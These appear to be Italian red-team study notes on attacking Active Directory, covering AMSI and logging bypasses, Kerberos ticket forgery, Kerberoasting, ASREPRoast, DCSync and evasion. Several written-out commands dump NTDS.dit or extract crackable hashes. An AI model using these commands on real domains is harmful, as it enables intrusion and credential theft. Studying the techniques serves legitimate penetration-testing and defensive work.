# Red-Team Oriented AD Attacks

### Powershell defenses in AD

Powershell è uno strumento builtin di Windows molto utile e versatile in quanto permette di eseguire codice senza llasciare tracce sul disco, scaricare ed eseguire codice da un altro dispositivo, interfacciarsi con .NET e interagire con le API di Windows.  
Proprio la sua versatilità l'ha reso nel tempo uno strumento di grande rilievo nel modo cybersec costringendo Microsoft a introdurre modifiche al suo funzionamento.  

#### Miglioramenti di Sicurezza in PowerShellv5

1. **Script block logging**  
Se questa funzione è attiva, anche se offuscato il codice viene registrato in chiaro con codice evento 4104 prima che l'engine di Powershell lo esegua.  
![image](https://user-images.githubusercontent.com/110602224/198315750-d22fa4f1-fc8b-4654-9461-704761633851.png)

2. **System-wide transcript file**  
Se attiva questa funzione registra quanto digitato in Powershell e registrato in un "transcript file" in una risorsa di rete monitorata dal Blue Team.  
![image](https://user-images.githubusercontent.com/110602224/198316830-c15292a5-a6e4-48e9-812b-1ebd0409a3a3.png)

3. **Constrained language mode**  
Questa funzione limita le funzionalità di Powershell rendendolo incapace di comunicare con .NET, COM, Win32 API.  
Se attiva e se AppLocker (https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd723678(v=ws.10)?redirectedfrom=MSDN) è in modalità "consenti", Powershell è bloccato di default in modalità limitata.  

Lo stesso accade se Device Guard with UMCI (https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/introduction-to-device-guard-virtualization-based-security-and-windows-defender-application-control) è in uso.  

4. **AMSI (Anti-Malware Software Interface**
A partire da Windows 10, se AMSI è attivo intercetta qualsiasi esecuzione di codice di Powershell e VBScript (prima che sia effettivamente eseguito).  
AMSI inoltra il codice intercettato al software anti-malware che restituisce un risultato positivo o negativo.  

Alcuni produttori che supportano AMSI sono Microsoft, Eset e AVG.  
![image](https://user-images.githubusercontent.com/110602224/198326888-f2007202-bfcc-4e68-8e7e-30dbc5cafea4.png)

#### Come Aggirare i miglioramenti di sicurezza in PowerShellv5

1. **AMSI Bypass**  
Link trovato da me: https://news.sophos.com/en-us/2021/06/02/amsi-bypasses-remain-tricks-of-the-malware-trade/  
Link trovato da me 2: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell  
Link: https://github.com/rasta-mouse/AmsiScanBufferBypass  
Link a unicorn: https://github.com/trustedsec/unicorn  

AMSI Bypass based on DLL: http://cn33liz.blogspot.com/2016/05/bypassing-amsi-using-powershell-5-dll.html  
Esecuzione di Powershell da altri processi: https://github.com/leechristensen/UnmanagedPowerShell  
Tool per audit e superare AMSI signatures: https://github.com/cobbr/PSAmsi  
Script che include diversi metodi per bypassare AMSI: https://github.com/samratashok/nishang/blob/master/Bypass/Invoke-AmsiBypass.ps1  

Sfruttare Powershellv2 se disponibile nella macchina target.  

2. **Constrained language mode and Powershell logging bypass**  
PSAttack (https://pentestit.com/psattack-offensive-powershell-console/) è un file eseguibile che include diversi tool per eseguire attacchi basati su Powershell.  
I moduli sono criptati e decriptati in memoria al momento dell'esecuzione.  
Per motivi di compatiblità, l'esecuzione di codice di Powershell da un file eseguibile non è soggetto a limitazione e quindi aggira la _constrained language mode_.  
Anche il log dell'evento è aggirato.  

Il trucco risiede nel fatto che PSAttack chiama la DLL _system.management.automation.dll_ che è Powershell ma alla sua versione più bassa... versione 2.  
Questo funziona fintanto che sulla macchina target è ammesso l'uso di PowershellV2.  

Link: https://improsec.com/tech-blog/babushka-dolls-or-how-to-bypass-application-whitelisting-and-constrained-powershell  

### Path to AD Compromise  
Tecniche di Post-Exploitation
![image](https://user-images.githubusercontent.com/110602224/198335236-27bdede2-9629-478f-9aeb-195a790cd8fc.png)

**TIP: The Mimikatz Patch (KB2871997)**
La patch in questione inserisce una voce nel registro di sistema che impedisce l'archiviazione di password in clear-text in LSASS (https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service).  
La patch può essere sovvertita.  

1. **MS14-068**
In sistemi non aggiornati la vulnerabilità MS14-068 Kerberos permette di rigenerare un ticket e passare da privilegi standard ad amministrativi in pochi minuti.  
La vulnerabilità riguarda un meccanismo insicuro di validazione dell'appartenenza al gruppo nei ticket di Kerberos usato dai Controller di Dominio.  
A partire da Windows 2012 questo exploit è più difficile da sfruttare.  

Per sfruttare questa vulnerabilità si usano i tool PyKEK (http://web.archive.org/web/20180107213459/https:/github.com/bidord/pykek) o kekeo (https://github.com/gentilkiwi/kekeo).  


2. **Unconstrained Delegation**  
![image](https://user-images.githubusercontent.com/110602224/198392939-70e1fca9-3cdc-4a13-a1eb-d904e0e7ad37.png)  

Quando Microsoft rilasciò Active Directory indico l'utilizzo di Kerberos come sistema di autenticazione degli utenti.  
Tenendo come riferimento l'immagine sopra, il ticket che l'utente riceve per autenticarsi al Web Server non può essere usato dal Web Server per impersonare l'utente e compiere azioni al Database Server per conto dell'utente.  
Per aggirare questo ostacolo, chiamato "Kerberos double-hop issue", Microsoft introdusse il concetto di _unconstrained delegation_.  

![image](https://user-images.githubusercontent.com/110602224/198393889-c8b8cea1-34b6-4e89-a6b7-25e692f9fd56.png)  

Per identificare computer con _Kerberos unconstrained delegation_ via PowerView: **Get-DomainComputer -Unconstrained**  
![image](https://user-images.githubusercontent.com/110602224/198394309-3005de1c-f986-4aa3-9f79-3b1d90ee7407.png)  

Quando un utente richiede un service ticket per un servizio in funzione su un server configurato per usare _unconstrained delegation_, il Domain Controller prende una copia del TGT dell'utente, lo inserice nel service ticket e lo restituisce all'utente.  
Quando l'utente finalmente presenta il service ticket al server dove è un funzione il servizio, il TGT è caricato in LSASS (in memoria) per un uso futuro.  

Per identificare quali utenti non hanno credenziali protette quando interagiscono con sistemi che fanno uso di _unconstrained delegation_, si può usare il comando di PowerView: **Get-DomainUser -AllowDelegation -AdminCount**  
![image](https://user-images.githubusercontent.com/110602224/198553997-1a47ece3-1039-43da-96e3-184705ddd57f.png)

**Esempio pratico.**  
Presupposto: attacco di social-engineering ha avuto successo e l'utente 2ndAdmin si connette al server che fa uso di _unconstrained delegation_ passando dal protocollo di autenticazione Kerberos oltre ad avere compromesso il server (accesso ad un admin o service account).
![image](https://user-images.githubusercontent.com/110602224/198554475-de4efa5e-3b36-4956-ba64-0af26fc616b7.png)  

Non è necessario che l'utente 2ndAdmin inserisca le proprie credenziali per accedere alla risorsa, è sufficiente che ci sia il tentativo di connessione.  
Attraverso questa sessione di rete, è possibile il TGT dell'utente 2ndAdmin, eseguire un attacco _pass-the-ticket_ e usare Powershell connesso in remoto al Domain Controller.  
Con accesso al DC si procede poi a eseguire il dump dell'hash della password dell'account KRBTGT.  

Dump dei ticket usando Powershell attarverso un agent di Empire.  
![image](https://user-images.githubusercontent.com/110602224/198555710-611ffd55-73d8-40ca-95e7-cbc82f14e9d8.png)

Tra questi ticket si trova anche il TGT dell'utente 2ndAdmin (in quanto le credenziali non sono protette se usate con _unconstrained delegation_).  
![image](https://user-images.githubusercontent.com/110602224/198556030-58bc1cc6-7761-4541-8e0a-64c7bcbc7e96.png)

Attacco _pass-the-ticket_ usando Mimikatz (kerberos::ptt).  
![image](https://user-images.githubusercontent.com/110602224/198556271-b507fe47-3b65-49a2-a64c-529da890ca78.png)

Accesso al DC usando Powershell da remoto (**PSRemoting**) sfruttando il ticket di 2ndAdmin.  
![image](https://user-images.githubusercontent.com/110602224/198556471-931b08a4-35b9-4c1b-922e-cee10dd46e47.png)
![image](https://user-images.githubusercontent.com/110602224/198556893-dcf0e938-aec9-415a-a685-e26df4db708d.png)

Dopo aver compromesso il DC, tra le varie operazioni che si possono eseguire, si cerca di ottenere l'hash della password dell'account KRBTGT e generare Golden Tickets.  
![image](https://user-images.githubusercontent.com/110602224/198557587-0ad3cdac-13c4-456e-ac51-3a9f80396afb.png)

Link extra:
1) https://www.semperis.com/blog/active-directory-unconstrained-delegation-security-risks/
2) https://harmj0y.medium.com/s4u2pwnage-36efe1a2777c
3) https://labs.withsecure.com/publications/trust-years-to-earn-seconds-to-break  


3. **OverPass-the-Hash**
Uno dei principali usi delle hash NTLM consiste nell'eseguire l'attacco _pass-the-hash_.  
Essendo una tecnica ormai molto nota, la sua esecuzione è individuata e loggata (evento 4624) e in molti casi bloccata da sistemi interni.  
Link: http://web.archive.org/web/20190219090631/http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/  

La tecnica _OverPass-the-hash_ consiste nel ripulire un sistema da tutte le chiavi di crittografia i Kerberos, inserire (inject) l'hash NTLM della password estratta da un altro attacco e "cambiarla" con un ticket di Kerberos.  
Quando si connette a un sistema che usa Kerberos avviene il normale processo di autenticazione ma i ticket sono generati partendo dalla "falsa" chiave che è in realtà l'hash NTLM.  

**Esempio pratico.**  
Dopo avere compromesso un sistema, si esegue mimikatz e si estraggono le hash NTLM. In questo caso se ne trova di un account amministratore.  
![image](https://user-images.githubusercontent.com/110602224/198563588-e79a6513-3f18-4f70-bdd5-5628aadd7b7a.png)

Esistono diversi modi per condurre l'attacco _OverPass-the-hash_ e uno di questi prevede l'utilizzo del modulo _credentials/mimikatz/pth_ in Empire.  
Di seguito altro modo con comandi manuali.  

Il comando mimikatz _sekurlsa::pth_ specificando solo l'hash NTLM causa quasi sicuramente un alert in quanto il livello di crittografia del campo _Encrypted\_Timestamp_ del messaggio _AS\_REQ_ subisce un downgrade.  
![image](https://user-images.githubusercontent.com/110602224/198837548-48fad66c-b55e-4e3a-8d4e-fe4848e7f6ed.png)

Per rendere la tecnica più "silenziosa" (stealthier) bisogna specificare le chiavi AES che si possono estrarre usando il modulo di Empire _credentials/mimikatz/command_.  
![image](https://user-images.githubusercontent.com/110602224/198837653-0e47b0c2-e6de-4126-986f-8cee2cc752a1.png)

Infine si esegue il comando _sekurlsa::pth_ specificando le chiavi AES ricavate al passaggio precedente.  
![image](https://user-images.githubusercontent.com/110602224/198837784-1d752f53-0bf6-4181-9659-ef21f7885ab6.png)

Per accedere al contenuto del Domain Controller bisogna rubare il token dal processo _notepad.exe_ creato al passaggio precedente.  
![image](https://user-images.githubusercontent.com/110602224/198837873-ea68be36-ef0d-46d8-9abb-0ae6d5b9861b.png)
![image](https://user-images.githubusercontent.com/110602224/198837909-34fe6e57-e034-475c-aea1-ef7cb948533d.png)


4. **Pivoting with Local Admin + Password in SYSVOL**

Non è raro trovare un set di credenziali in uso in più punti del dominio, come ad esempio le credenziali degli amministratori.  
Entrare in possesso di queste credenziali permette di eseguire azioni di post-exploitation come quelle descritte finora e di muoversi lateralmente all'interno del dominio.  

Quando una [Group Policy Preference](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn581922(v=ws.11)?redirectedfrom=MSDN) è creata in SYSVOL, un file XML associato al GPP è creato contente informazioni relativi alla configurazione.  
Se una password è inclusa è criptata con chiave a AES-256 bit.  

Microsoft ha rilasciato [la chiave di crittorafia AES citata appena sopra] (https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN) per cui è possibile decriptare eventuali password presenti nei file XML in SYSVOL che è leggibile per tutti gli utenti autenticati al dominio.  

Nonostanste sia stata rilasciata anche una patch da parte Microsoft per evitare che le credenziali siano inserite nei file XML, vecchie credenziali già presenti non sono rimosse ma rimangono memorizzate nel file XML.  
5. **Dangerous built-in groups usage**

Spesso le organizzazioni usano i gruppi preesistenti in Active Directory che usano diritti predefiniti, ad esempio i gruppi "Account Operators" e "Print Operators" possono accedere al Domain Controller principale di default.  
Di conseguenza compromettendo un semplice account helpdesk è possibile compromettere l'intero dominio.  


6.**Dumping AD Domain Credentials**

Nel caso in cui si vogliano ottenere le credenziali del dominio si possono percorrere, in questo esempio, due strade.  
Il primo metodo è di localizzare il file **NTDS.dit** (il file database di Active Directory) mentre il secondo metodo è di rubare le credenziali.  

**Trovare il file NTDS.dit nella rete**
Si può trovare nel backup del DC o su uno storage di rete esterno.  
Un amministratore di VMware ha i permessi per clonare un DC virtuale, compromettendo tale account è possibile quindi clonare il Domain Controller.  
Per accere al file NTDS.dit non è necessario avviare la clonazione, è sufficiente copiare i file di storage associati.  

Quando si accede a una macchina con dati sensibili è preferibile non utilizzare tool come mimikatz.  
Ad esempio è possibile usare task manager per scaricare LSASS in un file di dump, solo a quel punto contro il file offline si usa mimikatz.  
Il file di dump LSASS potrebbe includere le credenziali del Domain Admin.  

![image](https://user-images.githubusercontent.com/110602224/198839965-880d5594-096d-4de1-928c-433cec076f52.png)
(Individuato da Microsoft Defender come azione eseguita da malware).  

Se si riescono a estrarre le credenziali del Domain Administrator il passaggio successivo è di estrarre da remoto il file NTDS.dit e l'hive SYSTEM del Registro di Sistema.  
Con questi due file è possibile ottenere ogni password hash del Dominio.  

![image](https://user-images.githubusercontent.com/110602224/198840424-80431bbb-60bc-4d15-9de4-4e7febd388c9.png)

Un altro modo per estrarre il file NTDS.dit è di usare il comando _Invoke-NinjaCopy_ di PowerSploit.  
Invoke-NinjaCopy sfrutta PSRemoting.  
Da PowerShell in Empire: _usemodule collection/ninjacopy_  

Un'altra alternativa è l'utitlizzo di NTDSUtil.  
Questo tool è usato dagli amministratori per amministrare o gestire il database di Active Drirectory.  
Per usarlo è necessario l'accesso al Domain Controller.  
Usare questo tool per creare un "Install from media" crea una copia del file NTDS.dit (e l'hive SYSTEM): _ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q_  
![image](https://user-images.githubusercontent.com/110602224/198840910-c996d0cf-49e8-4fa6-a075-e8e0488ce1fd.png)

![image](https://user-images.githubusercontent.com/110602224/198840929-bb8e76a9-400c-440a-80b8-568b4d276bb6.png)

**DCSync (mimikatz)**  
Un modo migliore per ottenere le hash delle password del dominio consiste nell'utilizzo di DCSync.  
Prima dell'introduzione di DCSync l'estrazione delle password KRBTGT si eseguiva usando mimikatz o Invoke-Mimikatz su un Domain Controller.  

DCSync consente di scaricare le hash delle password (incluse quelle precedenti) dalla rete senza la necessità di effettuare un logon o di arrivare al file NTDS.dit.  
Sono comunque richiesti privilegi speciali per l'esecuzione di DCSync. I membri di "Administrators", "Domain Admins", "Enterprise Admins" e l'account del DC possono eseguire DCSync.  

Un utente standard può essere delegato con i privilegi necessari per estrarre le hash delle password.  
![image](https://user-images.githubusercontent.com/110602224/198841583-aa7db3d1-e719-4333-b11e-7912aca11042.png)

![image](https://user-images.githubusercontent.com/110602224/198841598-b18d8edb-5bea-423a-a8e2-50efcc8bd8f0.png)

![image](https://user-images.githubusercontent.com/110602224/198841619-c452162f-e469-468d-b015-2e8cce3be6d5.png)


7. **Golden Tickets**  
L'account KRBTGT è usato per criptare e firmare tutti i ticket rilasciati all'interno del dominio, per questo motivo entrare in possesso dell'hash della password di tale account è molto importante per ottenere, ad esempio, un numero infinito di ticket per servizi (TGS).  
Questi ticket creati usando l'account KRBTGT prendono il nome di Golden Tickets.  

![image](https://user-images.githubusercontent.com/110602224/198874770-88fe0dfa-8175-412c-8865-7f16a488fd89.png)

Requisiti per la creazione di TGS: 
- Domain Name
- Domain SID
- Domain KRBTGT Account NTLM Password Hash
- UserID for impersonation

Fino all'introduzione della _SID History_ un Golden Ticket aveva validità limitata al Dominio nel quale era stato creato.  
Ora è possibile manipolare i ticket in modo tale da renderli validi per ogni dominio nella foresta, estraendo le hash delle password degli account KRBTGT dei domini figli.  

**Esempio**  
Dominio figlio: ELS-CHILD.
Stato: Dominio figlio già compromesso e agent di Empire in funzione.  

Comando per estrarre i legami "Trust" del dominio corrente.  
![image](https://user-images.githubusercontent.com/110602224/198875017-3d42b25b-7328-412a-9c60-e51486bcfedd.png)

Prima di sfruttare la funzionalità _SID History_ bisogna identificare il SID del dominio padre.  
![image](https://user-images.githubusercontent.com/110602224/198875093-e2f3a7d1-8f63-43bb-a7d4-c911864f66a2.png)

Estrarre poi l'hash della password dell'account KRBTGT del dominio "ELS-CHILD" usando DCSync: **usemodule credentials/mimikats/dcsync**  
![image](https://user-images.githubusercontent.com/110602224/198875169-a160e33b-9158-4265-8302-77fac236e8ae.png)

Creazione del ticket usando Empire: **usemodule credentials/mimikatz/golden_ticket**  
Sintassi del comando mimikatz esegutito dal modulo:  
![image](https://user-images.githubusercontent.com/110602224/198875268-a07b8a51-ead8-458a-9da1-67ff8a784fae.png)

![image](https://user-images.githubusercontent.com/110602224/198875340-7b71fd11-322e-4164-91a5-f316f70c27f0.png)

![image](https://user-images.githubusercontent.com/110602224/198875361-b98ec0ce-0ae2-4dd6-9b63-af5cf4462204.png)

**Note per evasione (evasion)**  
L'utilizzo di DCSync lascia tracce nei log di sistema.  
Per non creare ulteriore rumore nel mentre che si usa DCSync sul dominio padre è possibile inserire nell'opzione "ExtraSids" il SID dei "Domain Controller" del dominio padre e il SID degli "Enterprise Domain Controller".  

Per compromettere totalmente il Domain Controller del dominio padre, si può usare il comando **Invoke-DCOM**: **usemodule lateral_movement/invoke_dcom**  
![image](https://user-images.githubusercontent.com/110602224/198875604-d6f6b429-7acc-49e3-897a-520d848d31c8.png)


8. **Kerberoast**  
Questa tecnica consiste nel crackare offline i ticket TGS.  
Le probabilità di successo aumentano in base alla debolezza della policy in uso per la creazione e riuso delle password.  

Il fatto che spesso gli account di servizio hanno più privilegi del necessario e spesso sono anche parte del gruppo "Domain Admins"... rende questa tecnica una possibile strada per una maggiore compromissione del dominio.  

I passaggi sono:  
1) Richiedere un TGS per l'SPN di un account di un servizio (serve un TGT utente valido)  
2) Il Domain Controller cripta il ticket con l'account del servizio associato all'SPN e invia il TGS all'utente  
3) Il tipo di crittografia del ticket Kerberos richiesto è RC4_HMAC_MD5 (che significa che è stato criptato usando l'hash della password NTLM dell'account di servizio)  
Comando Empire: **usemodule credentials/invoke_kerberoast**  
![image](https://user-images.githubusercontent.com/110602224/198875866-b8184911-6f96-420e-a503-1d851e380480.png)

Salvare il contenuto come file accessibile da John the Ripper (https://github.com/openwall/john).  
![image](https://user-images.githubusercontent.com/110602224/198875926-915c8f32-21f0-45a2-b861-8205e9359198.png)

Per eseguire questa tecnica manualmente bisogna richiedere il TGS per l'SPN individuato.  
![image](https://user-images.githubusercontent.com/110602224/198875976-7dead7d5-6370-4e88-bbbb-70a7fd8c14b7.png)

Usare poi il comando di mimikatz **kerberos::list/export** e infine usare lo script [tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py) contro il ticket estratto.  


Inoltre:  
![image](https://user-images.githubusercontent.com/110602224/198876074-a9884981-a217-493b-b50a-9f86bc940391.png)

Questa tecnica prende il nome di _targeted kerberoasting_ e si può usare col seguente comando PowerView:  
![image](https://user-images.githubusercontent.com/110602224/198876348-de945026-f3f4-44a7-982d-5ef51c921295.png)


9. **Silver Tickets**  
A differenza di un Golden Ticket, un Silver Ticket è comunque un ticket TGS valido ma risulta anche più "stealth" rispetto alla sua controparte.  
Un TGS valido è forgiato e quindi non c'è comunicazione con il Domain Controller, il Silver Ticket è criptato/firmato dal service account con l'uso di credenziali dello stesso service account o di un account computer.  

Un Silver Ticket funziona solo per un dato servizio su uno specifico server.  
Inoltre la grande maggioranza dei servizi non esegue la validazione [PAC](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84).  

I requisiti per la creazione di un Silver Ticket sono:  
- l'hash della password di un service account se il servizio target opera come account utente (hash recuperabile con la tecnica Kerberoast)  
- l'hash della password di un account computer se il servizio target è hostato dal computer (hash recuperabile con mimikatz)  

![image](https://user-images.githubusercontent.com/110602224/199092940-f19c9151-a50a-4b4d-a777-9ff77253c2eb.png)

L'aspetto interessante dei Silver Ticket è che la loro generazione non prevede la comunicazione con il Domain Controller, di conseguenza se un'organizzazione raacoglie i principali eventi di sicurezza dai log nel Domain Controller, è probabile che non rimanga traccia dei Silver Ticket.  

**Esempio**  
Presupposti: compromissine di utente del dominio, elevazione dei privilegi, kerberoast per ottenere hash della password del service account usato dal servizio MSSQL.  
L'hash della password del service account non garantisce l'accesso al database.  
Serve quindi creare un Silver Ticket per il MSSQLsv SPN usando ll'agent di Empire:  
![image](https://user-images.githubusercontent.com/110602224/199096971-411a8c69-4845-42f5-b847-65092b718cba.png)

A questo punto è possibile interagire col database come DBA.  
![image](https://user-images.githubusercontent.com/110602224/199097215-29469054-e835-479e-a810-1de568dc8930.png)



Esiste anche uno scenario in cui i Silver Ticket sono più pericolosi dei Golden Ticket, ovvero usare l'hash della password di un computer account.  
In uno scenario di recovery dopo un breach vengono cambiare tutte le password degli account ma spesso i computer account sono... dimenticati.  

Di conseguenza, se si ha a disposizione l'hash della password di un computer account di un Domain Controller possiamo creare service tickets per tutti i servizi in uso sul DC e quindi agire come una specie di Domain Admin.  

Se ad esempio, dopo un breach sono cambiate tutte le password tranne quelle dei computer account compreso il Domain Controller è sufficiente generare due Silver Ticket (uno per "http" e uno per "wsman") per compromettere di nuovo il DC.  
![image](https://user-images.githubusercontent.com/110602224/199098728-4da28f2f-f8ac-4288-bd2f-db96cb324bbc.png)

Con questi due ticket si hanno i diritti da amministratore per eseguire WinRM o PSRemoting sul DC.  
![image](https://user-images.githubusercontent.com/110602224/199099217-a5757c93-62d3-4285-96a7-0b33fc8498e0.png)

**Note**  
- Come comportamento predefinito, le password degli account computer cambiano ogni 30 giorni e due password sono installate nei computer  
- Le validazioni PAC non servirebbero in quanto i servizi target sono servizi di sistema  


10. **Trust tickets**  
Quando si crea un trust, si viene a creare una password condivisa chiamata _inter-realm key_.  
Questo vale per ogni trust, sia quelli creati da amministratori sia automaticamente all'aggiunti di nuovi DC alla foresta.  
![image](https://user-images.githubusercontent.com/110602224/199100475-e0e18a11-ad42-4219-ba6d-5dcb5fc3793d.png)

Un utente nel dominio blu è già loggato e vuole accedere alle risorse nel dominio verde, attraverso il trust.  
Il DC nel dominio blu crea e invia un nuovo TGS all'utente insieme ai riferimenti del DC del dominio verde.  
Questo TGT inter-Trust è formattato come qualsiasi TGT MA non è firmato dall'account KRBTGT per nessuno dei due domini.  
È firmato e criptato usando la inter-realm key.  

Avere accesso a tale chiave è possibile usare ticket cross-domain.  
Questo significa che è possibile impersonare qualsiasi utente del dominio blu e acedere risorse o servizi nel dominio verde che ha avuto permesso dal dominio blu.  

**Come creare Trust Ticket per un trust esterno alla Foresta di Active Directory**  
La chiave trust si può ricavare facendo il dump delle credenziali di Active Directory.  
Ogni trust ha associato un account che contiene l'hash della password NTLM del trust.  
Comando per generare i Trust Tickets:  
![image](https://user-images.githubusercontent.com/110602224/199102371-de48c818-1ef0-4a6a-a1ff-b833c395539b.png)

Una volta creato il ticket si può usare il parametro _asktgs_ di kekeo per ottenere un TGS per ogni servizio target nel dominio esterno.  
Esempio per il servizio CIFS:  
![image](https://user-images.githubusercontent.com/110602224/199102722-38126ea8-2a3f-4649-9293-4c55c04cd203.png)

Usando kirbikator per iniettare il TGS è possibile accedere al servizio nel dominio esterno.  
![image](https://user-images.githubusercontent.com/110602224/199103193-1a03db3d-17fa-40bf-9c90-c9d71e339378.png)

**Come creare Trust Tickets per un trust interno alla Foresta di Active Directory**  
Mimikatz può estrarre tutti i dati delle password del trust interno da un dominio Active Directory.  
![image](https://user-images.githubusercontent.com/110602224/199103683-14cd97b6-a4ba-48a9-aad4-78d098dccfe1.png)

È possibile usare questa password NTLM per creare il Trust Ticket e comprometter il "parent".  
Per la creazione del ticket interno si segue la stessa procedura del ticket esterno.  


### Leveraging Kerberos Authentication  

1. **Kerberos tickets when NTLM is disabled**  
Essere in possesso di una password valida non presenta sempre una via semplice e percorribile in quanto, ad esempio, NTLM potrebbe essere disattivato.  
È possibile però configurare Kerberos in locale per verificare un TGT.  
[Link](http://passing-the-hash.blogspot.com/2016/06/nix-kerberos-ms-active-directory-fun.html?m=1)  

Un metodo è usare _impacket_.  
Esempio con utente _2ndAdmin_.  
![image](https://user-images.githubusercontent.com/110602224/199106206-c6773178-5778-442c-be7e-8eb97456f442.png)

![image](https://user-images.githubusercontent.com/110602224/199106462-d763b826-06b7-45a6-94cc-541e818ef5b2.png)


2. **Password spraying using Kerberos**  
Password spraying contro Kerberos ha i suoi vantaggi rispetto alla stessa tecnica contro altri protocolli di autenticazione ed è considerato stealthier.  
I vantaggi principali sono:  
- Non servono credenziali per eseguire l'attacco  
- Errori pre-auth di Kerberos non sono loggati con un normale evento di errato logon (4625) ma sono loggati con eventi (4771)
- Kerberos informa se il nome utente è incorretto  
- Gli account che non richiedono pre-authentication possono essere identificati usando ASPREPRoast  

**Nota**: Password spraying può portare al blocco degli account utente  

[Rubeus](https://github.com/GhostPack/Rubeus)  
![image](https://user-images.githubusercontent.com/110602224/199108600-5572d702-f12a-4b0e-86bc-e45f66428c27.png)

Tool [kerbrute](https://github.com/TarlogicSecurity/kerbrute) serve per password spraying da Linux.  
![image](https://user-images.githubusercontent.com/110602224/199109002-18b041b3-bcd4-47cd-9f11-766fbecb349c.png)

----  

1. **Targeted Kerberoasting**  
Avere i permessi di scrittura per un oggetto "utente" assicura la possibilità di aggiungere un attributo Service Principal Name (SPN) a quell'utente con un valore casuale.  
A questo punto si esegue il kerberoast sul ticket e si attacca il ticket per estrarre la password.  

La preparazione dell'SPN si può fare con [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1), il modulo ActiveDirectory di Powershell o [AddSPN](https://github.com/dirkjanm/krbrelayx/blob/master/addspn.py).  
Da un punto di visto della compatibilità e semplicità di esecuzione è preferibile usare il modulo di ActiveDirectory per i sitemi che usano Windows e AddSPN per attaccare da sistemi che usano Linux.  

![image](https://user-images.githubusercontent.com/110602224/199334859-741acfab-e345-4558-92ee-0344f4a1d636.png)

Link: https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py  
![image](https://user-images.githubusercontent.com/110602224/199335458-bb2f1692-743c-42b1-9642-312641e2366c.png)

![image](https://user-images.githubusercontent.com/110602224/199335568-3b78c307-ca7d-4a13-a2e4-d89527bfc8fa.png)

![image](https://user-images.githubusercontent.com/110602224/199335756-67b5cdfb-4ea5-401c-9c08-b430f76364e0.png)

![image](https://user-images.githubusercontent.com/110602224/199335824-eeef7258-26cf-4e3f-a31a-a32d14e4652f.png)

Link: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1  
![image](https://user-images.githubusercontent.com/110602224/199336115-2c989816-bef2-471e-8542-5cbfe68d6fb1.png)

![image](https://user-images.githubusercontent.com/110602224/199336464-2c98ceab-c168-43a3-8e0e-ba99d7f39b53.png)

![image](https://user-images.githubusercontent.com/110602224/199336531-e96fd68d-1fed-4966-80a3-abf05cf4b478.png)

![image](https://user-images.githubusercontent.com/110602224/199336915-71cd072d-8f1c-473e-b905-75580c98dc15.png)


2. **ASREPRoast**  
Questa tecnica mira a compromettere gli utenti per i quali non è richiesta la preautenticazione di Kerberos.  
Si invia una richiesta AS_REQ al KDC e il messaggio AS_REP di risposta si forza offline.  
![image](https://user-images.githubusercontent.com/110602224/199339125-84552a44-8f7f-445e-8534-57c18e2eae68.png)

Comando da Windows usando Rubeus: **.\ Rubeus.exe asreproast /format:hashcat /outfile:asreproast.hashes**  
![image](https://user-images.githubusercontent.com/110602224/199339358-6ee51b57-ee93-411e-939d-5f8d5b5d8cc8.png)

Comando da Linux usando [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py): **GetNPUsers.py [Domain/User] -request -format hashcat -outputfile asreproast.hashes**  
![image](https://user-images.githubusercontent.com/110602224/199339696-eff544af-301d-4515-8db3-f6b3af442675.png)

Le hash ottenute sono forzabili usando JohnTheRipper o Hashcat:  
- **john \[Nome file con lista hash\] --wordlist=\[Wordlist\]**
- **hashcat -m 18200 -force -a 0 \[Nome file con lista hash\] \[Wordlist\]**  


3. **Over-pass-the-hash / Pass the Key (PTK)**  
Questa tecnica è sfruttabile se NTLM è disattivato in quanto si sfrutta l'hash NTLM per ottente un TGT per ottenere accesso alle risorse per cui l'utente "sfruttato" ha privilegi di accesso.  

![image](https://user-images.githubusercontent.com/110602224/199340794-b4dff28c-43bc-4662-bcd2-f00c5650db4d.png)

![image](https://user-images.githubusercontent.com/110602224/199340897-597cc6c6-1e5f-486f-8f2d-df24a63dd0e6.png)

Link:https://github.com/sosdave/KeyTabExtract  
![image](https://user-images.githubusercontent.com/110602224/199341184-dc6692c8-0f3b-471b-a6b2-ea0cc2863f87.png)

Link: https://github.com/its-a-feature/bifrost  
![image](https://user-images.githubusercontent.com/110602224/199341707-9a0d5d5a-59e2-4af7-88bd-e607314929dd.png)


4. **Pass The Ticket (PTT)**  
Tecnica simile a Pass-The-Key. In questo caso il ticket è estratto dall'host nel quale l'utente è autenticato.  
![image](https://user-images.githubusercontent.com/110602224/199342588-5a77ae37-469e-45e6-a4ab-7f055f1ff1e4.png)

![image](https://user-images.githubusercontent.com/110602224/199342670-4c9ee781-51e6-4a47-aea1-35f2fd36180b.png)

Link: https://github.com/TarlogicSecurity/tickey  
Link: https://web.archive.org/web/20190626085621/https://www.delaat.net/rp/2016-2017/p97/report.pdf  

![image](https://user-images.githubusercontent.com/110602224/199343354-3815c2d9-8296-45be-8234-bc9c7632cecb.png)

![image](https://user-images.githubusercontent.com/110602224/199343473-0e7fb1ca-2c81-4aa5-a6ff-dae6ba45e6f1.png)


5. **The "Printer Bug" and Kerberos Unconstrained Delegation**  
Passaggi della tecnica:  
1) Compromettere un server con Kerberos Unconstrained Delegation attiva
2) Lo Spooler di Stampa deve essere attivo sul Domain Controller (configurazione di default)
3) Usare Rubeus per il monitoraggio TGT
